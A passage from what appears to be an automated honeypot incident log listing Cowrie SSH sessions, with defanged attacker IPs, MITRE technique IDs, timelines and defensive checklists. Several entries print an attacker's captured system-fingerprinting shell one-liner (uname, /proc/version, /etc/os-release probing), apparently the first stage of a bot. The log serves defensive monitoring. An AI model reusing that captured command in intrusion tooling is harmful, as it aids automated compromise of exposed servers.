| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:06:24` | `cowrie.session.connect` |
| `2026-07-25 09:06:24` | `cowrie.client.version` |
| `2026-07-25 09:06:24` | `cowrie.client.kex` |
| `2026-07-25 09:06:27` | `cowrie.login.success` |
| `2026-07-25 09:06:29` | `cowrie.session.params` |
| `2026-07-25 09:06:29` | `cowrie.command.input` |
| `2026-07-25 09:06:29` | `cowrie.command.input` |
| `2026-07-25 09:06:29` | `cowrie.command.input` |
| `2026-07-25 09:06:29` | `cowrie.command.input` |
| `2026-07-25 09:06:29` | `cowrie.command.input` |
| `2026-07-25 09:06:29` | `cowrie.command.success` |
| `2026-07-25 09:06:29` | `cowrie.command.input` |
| `2026-07-25 09:06:29` | `cowrie.command.input` |
| `2026-07-25 09:06:29` | `cowrie.command.input` |
| `2026-07-25 09:06:29` | `cowrie.command.input` |
| `2026-07-25 09:06:30` | `cowrie.log.closed` |
| `2026-07-25 09:06:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-125e05acfc11

| Field | Detail |
|---|---|
| **Source IP** | `49.124.153[.]33` |
| **First Seen** | 2026-07-25 09:06 |
| **Last Seen** | 2026-07-25 09:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:06:39` | `cowrie.session.connect` |
| `2026-07-25 09:06:40` | `cowrie.client.version` |
| `2026-07-25 09:06:40` | `cowrie.client.kex` |
| `2026-07-25 09:06:42` | `cowrie.login.success` |
| `2026-07-25 09:06:42` | `cowrie.direct-tcpip.request` |
| `2026-07-25 09:06:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.153[.]33` to AbuseIPDB if not already reported
- [ ] Block `49.124.153[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c70ed7bd152a

| Field | Detail |
|---|---|
| **Source IP** | `124.88.174[.]143` |
| **First Seen** | 2026-07-25 09:06 |
| **Last Seen** | 2026-07-25 09:06 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:06:48` | `cowrie.session.connect` |
| `2026-07-25 09:06:49` | `cowrie.client.version` |
| `2026-07-25 09:06:49` | `cowrie.client.kex` |
| `2026-07-25 09:06:52` | `cowrie.login.success` |
| `2026-07-25 09:06:53` | `cowrie.direct-tcpip.request` |
| `2026-07-25 09:06:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.88.174[.]143` to AbuseIPDB if not already reported
- [ ] Block `124.88.174[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fc775b6f22b

| Field | Detail |
|---|---|
| **Source IP** | `188.219.104[.]210` |
| **First Seen** | 2026-07-25 09:07 |
| **Last Seen** | 2026-07-25 09:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:07:52` | `cowrie.session.connect` |
| `2026-07-25 09:07:53` | `cowrie.client.version` |
| `2026-07-25 09:07:53` | `cowrie.client.kex` |
| `2026-07-25 09:07:54` | `cowrie.login.success` |
| `2026-07-25 09:07:54` | `cowrie.direct-tcpip.request` |
| `2026-07-25 09:07:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.219.104[.]210` to AbuseIPDB if not already reported
- [ ] Block `188.219.104[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a7d7d8ef1bf

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 09:08 |
| **Last Seen** | 2026-07-25 09:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:08:19` | `cowrie.session.connect` |
| `2026-07-25 09:08:19` | `cowrie.client.version` |
| `2026-07-25 09:08:19` | `cowrie.client.kex` |
| `2026-07-25 09:08:22` | `cowrie.login.success` |
| `2026-07-25 09:08:23` | `cowrie.session.params` |
| `2026-07-25 09:08:23` | `cowrie.command.input` |
| `2026-07-25 09:08:23` | `cowrie.command.input` |
| `2026-07-25 09:08:23` | `cowrie.command.input` |
| `2026-07-25 09:08:23` | `cowrie.command.input` |
| `2026-07-25 09:08:23` | `cowrie.command.input` |
| `2026-07-25 09:08:23` | `cowrie.command.success` |
| `2026-07-25 09:08:23` | `cowrie.command.input` |
| `2026-07-25 09:08:23` | `cowrie.command.input` |
| `2026-07-25 09:08:23` | `cowrie.command.input` |
| `2026-07-25 09:08:23` | `cowrie.command.input` |
| `2026-07-25 09:08:24` | `cowrie.log.closed` |
| `2026-07-25 09:08:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5727689b0863

| Field | Detail |
|---|---|
| **Source IP** | `14.49.197[.]174` |
| **First Seen** | 2026-07-25 09:08 |
| **Last Seen** | 2026-07-25 09:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:08:50` | `cowrie.session.connect` |
| `2026-07-25 09:08:51` | `cowrie.client.version` |
| `2026-07-25 09:08:51` | `cowrie.client.kex` |
| `2026-07-25 09:08:53` | `cowrie.login.success` |
| `2026-07-25 09:08:54` | `cowrie.direct-tcpip.request` |
| `2026-07-25 09:08:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.49.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `14.49.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1a09fb7c6b1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 09:10 |
| **Last Seen** | 2026-07-25 09:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:10:11` | `cowrie.session.connect` |
| `2026-07-25 09:10:12` | `cowrie.client.version` |
| `2026-07-25 09:10:12` | `cowrie.client.kex` |
| `2026-07-25 09:10:14` | `cowrie.login.success` |
| `2026-07-25 09:10:15` | `cowrie.session.params` |
| `2026-07-25 09:10:15` | `cowrie.command.input` |
| `2026-07-25 09:10:15` | `cowrie.command.input` |
| `2026-07-25 09:10:15` | `cowrie.command.input` |
| `2026-07-25 09:10:15` | `cowrie.command.input` |
| `2026-07-25 09:10:15` | `cowrie.command.input` |
| `2026-07-25 09:10:15` | `cowrie.command.success` |
| `2026-07-25 09:10:15` | `cowrie.command.input` |
| `2026-07-25 09:10:15` | `cowrie.command.input` |
| `2026-07-25 09:10:15` | `cowrie.command.input` |
| `2026-07-25 09:10:15` | `cowrie.command.input` |
| `2026-07-25 09:10:16` | `cowrie.log.closed` |
| `2026-07-25 09:10:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-153a24b60c9b

| Field | Detail |
|---|---|
| **Source IP** | `125.69.76[.]148` |
| **First Seen** | 2026-07-25 09:11 |
| **Last Seen** | 2026-07-25 09:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:11:57` | `cowrie.session.connect` |
| `2026-07-25 09:11:57` | `cowrie.client.version` |
| `2026-07-25 09:11:57` | `cowrie.client.kex` |
| `2026-07-25 09:11:59` | `cowrie.login.success` |
| `2026-07-25 09:12:00` | `cowrie.direct-tcpip.request` |
| `2026-07-25 09:12:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.69.76[.]148` to AbuseIPDB if not already reported
- [ ] Block `125.69.76[.]148` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1bff612d519

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 09:12 |
| **Last Seen** | 2026-07-25 09:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:12:06` | `cowrie.session.connect` |
| `2026-07-25 09:12:07` | `cowrie.client.version` |
| `2026-07-25 09:12:07` | `cowrie.client.kex` |
| `2026-07-25 09:12:09` | `cowrie.login.success` |
| `2026-07-25 09:12:10` | `cowrie.session.params` |
| `2026-07-25 09:12:10` | `cowrie.command.input` |
| `2026-07-25 09:12:10` | `cowrie.command.input` |
| `2026-07-25 09:12:10` | `cowrie.command.input` |
| `2026-07-25 09:12:10` | `cowrie.command.input` |
| `2026-07-25 09:12:10` | `cowrie.command.input` |
| `2026-07-25 09:12:10` | `cowrie.command.success` |
| `2026-07-25 09:12:10` | `cowrie.command.input` |
| `2026-07-25 09:12:10` | `cowrie.command.input` |
| `2026-07-25 09:12:10` | `cowrie.command.input` |
| `2026-07-25 09:12:10` | `cowrie.command.input` |
| `2026-07-25 09:12:11` | `cowrie.log.closed` |
| `2026-07-25 09:12:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f31573fd1b7f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 09:13 |
| **Last Seen** | 2026-07-25 09:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:13:58` | `cowrie.session.connect` |
| `2026-07-25 09:13:59` | `cowrie.client.version` |
| `2026-07-25 09:13:59` | `cowrie.client.kex` |
| `2026-07-25 09:14:01` | `cowrie.login.success` |
| `2026-07-25 09:14:02` | `cowrie.session.params` |
| `2026-07-25 09:14:02` | `cowrie.command.input` |
| `2026-07-25 09:14:02` | `cowrie.command.input` |
| `2026-07-25 09:14:02` | `cowrie.command.input` |
| `2026-07-25 09:14:02` | `cowrie.command.input` |
| `2026-07-25 09:14:02` | `cowrie.command.input` |
| `2026-07-25 09:14:02` | `cowrie.command.success` |
| `2026-07-25 09:14:02` | `cowrie.command.input` |
| `2026-07-25 09:14:02` | `cowrie.command.input` |
| `2026-07-25 09:14:02` | `cowrie.command.input` |
| `2026-07-25 09:14:02` | `cowrie.command.input` |
| `2026-07-25 09:14:03` | `cowrie.log.closed` |
| `2026-07-25 09:14:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba2a05ddefa8

| Field | Detail |
|---|---|
| **Source IP** | `34.156.136[.]59` |
| **First Seen** | 2026-07-25 09:15 |
| **Last Seen** | 2026-07-25 09:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:15:23` | `cowrie.session.connect` |
| `2026-07-25 09:15:23` | `cowrie.login.success` |
| `2026-07-25 09:15:23` | `cowrie.session.params` |
| `2026-07-25 09:15:23` | `cowrie.command.input` |
| `2026-07-25 09:15:23` | `cowrie.command.input` |
| `2026-07-25 09:15:23` | `cowrie.command.failed` |
| `2026-07-25 09:15:23` | `cowrie.command.input` |
| `2026-07-25 09:15:23` | `cowrie.log.closed` |
| `2026-07-25 09:15:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.136[.]59` to AbuseIPDB if not already reported
- [ ] Block `34.156.136[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91fe146ba863

| Field | Detail |
|---|---|
| **Source IP** | `34.156.136[.]59` |
| **First Seen** | 2026-07-25 09:15 |
| **Last Seen** | 2026-07-25 09:15 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:15:36` | `cowrie.session.connect` |
| `2026-07-25 09:15:36` | `cowrie.login.success` |
| `2026-07-25 09:15:37` | `cowrie.session.params` |
| `2026-07-25 09:15:37` | `cowrie.command.input` |
| `2026-07-25 09:15:37` | `cowrie.command.failed` |
| `2026-07-25 09:15:47` | `cowrie.log.closed` |
| `2026-07-25 09:15:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.136[.]59` to AbuseIPDB if not already reported
- [ ] Block `34.156.136[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b252b61fd423

| Field | Detail |
|---|---|
| **Source IP** | `34.156.136[.]59` |
| **First Seen** | 2026-07-25 09:15 |
| **Last Seen** | 2026-07-25 09:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:15:38` | `cowrie.session.connect` |
| `2026-07-25 09:15:38` | `cowrie.login.success` |
| `2026-07-25 09:15:39` | `cowrie.session.params` |
| `2026-07-25 09:15:39` | `cowrie.command.input` |
| `2026-07-25 09:15:47` | `cowrie.log.closed` |
| `2026-07-25 09:15:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.136[.]59` to AbuseIPDB if not already reported
- [ ] Block `34.156.136[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-143e6fb3d219

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 09:17 |
| **Last Seen** | 2026-07-25 09:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:17:48` | `cowrie.session.connect` |
| `2026-07-25 09:17:48` | `cowrie.client.version` |
| `2026-07-25 09:17:48` | `cowrie.client.kex` |
| `2026-07-25 09:17:49` | `cowrie.login.success` |
| `2026-07-25 09:17:51` | `cowrie.session.params` |
| `2026-07-25 09:17:51` | `cowrie.command.input` |
| `2026-07-25 09:17:51` | `cowrie.command.input` |
| `2026-07-25 09:17:51` | `cowrie.command.input` |
| `2026-07-25 09:17:51` | `cowrie.command.input` |
| `2026-07-25 09:17:51` | `cowrie.command.input` |
| `2026-07-25 09:17:51` | `cowrie.command.success` |
| `2026-07-25 09:17:51` | `cowrie.command.input` |
| `2026-07-25 09:17:51` | `cowrie.command.input` |
| `2026-07-25 09:17:51` | `cowrie.command.input` |
| `2026-07-25 09:17:51` | `cowrie.command.input` |
| `2026-07-25 09:17:52` | `cowrie.log.closed` |
| `2026-07-25 09:17:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c229d6b09778

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 09:19 |
| **Last Seen** | 2026-07-25 09:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:19:45` | `cowrie.session.connect` |
| `2026-07-25 09:19:45` | `cowrie.client.version` |
| `2026-07-25 09:19:45` | `cowrie.client.kex` |
| `2026-07-25 09:19:47` | `cowrie.login.success` |
| `2026-07-25 09:19:48` | `cowrie.session.params` |
| `2026-07-25 09:19:48` | `cowrie.command.input` |
| `2026-07-25 09:19:48` | `cowrie.command.input` |
| `2026-07-25 09:19:48` | `cowrie.command.input` |
| `2026-07-25 09:19:48` | `cowrie.command.input` |
| `2026-07-25 09:19:48` | `cowrie.command.input` |
| `2026-07-25 09:19:48` | `cowrie.command.success` |
| `2026-07-25 09:19:48` | `cowrie.command.input` |
| `2026-07-25 09:19:48` | `cowrie.command.input` |
| `2026-07-25 09:19:48` | `cowrie.command.input` |
| `2026-07-25 09:19:48` | `cowrie.command.input` |
| `2026-07-25 09:19:48` | `cowrie.log.closed` |
| `2026-07-25 09:19:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6d2eda14c80

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 09:21 |
| **Last Seen** | 2026-07-25 09:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:21:35` | `cowrie.session.connect` |
| `2026-07-25 09:21:36` | `cowrie.client.version` |
| `2026-07-25 09:21:36` | `cowrie.client.kex` |
| `2026-07-25 09:21:38` | `cowrie.login.success` |
| `2026-07-25 09:21:40` | `cowrie.session.params` |
| `2026-07-25 09:21:40` | `cowrie.command.input` |
| `2026-07-25 09:21:40` | `cowrie.command.input` |
| `2026-07-25 09:21:40` | `cowrie.command.input` |
| `2026-07-25 09:21:40` | `cowrie.command.input` |
| `2026-07-25 09:21:40` | `cowrie.command.input` |
| `2026-07-25 09:21:40` | `cowrie.command.success` |
| `2026-07-25 09:21:40` | `cowrie.command.input` |
| `2026-07-25 09:21:40` | `cowrie.command.input` |
| `2026-07-25 09:21:40` | `cowrie.command.input` |
| `2026-07-25 09:21:40` | `cowrie.command.input` |
| `2026-07-25 09:21:40` | `cowrie.log.closed` |
| `2026-07-25 09:21:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-454767cb4257

| Field | Detail |
|---|---|
| **Source IP** | `65.20.191[.]231` |
| **First Seen** | 2026-07-25 09:21 |
| **Last Seen** | 2026-07-25 09:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:21:51` | `cowrie.session.connect` |
| `2026-07-25 09:21:52` | `cowrie.client.version` |
| `2026-07-25 09:21:52` | `cowrie.client.kex` |
| `2026-07-25 09:21:53` | `cowrie.login.success` |
| `2026-07-25 09:21:54` | `cowrie.direct-tcpip.request` |
| `2026-07-25 09:21:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.191[.]231` to AbuseIPDB if not already reported
- [ ] Block `65.20.191[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

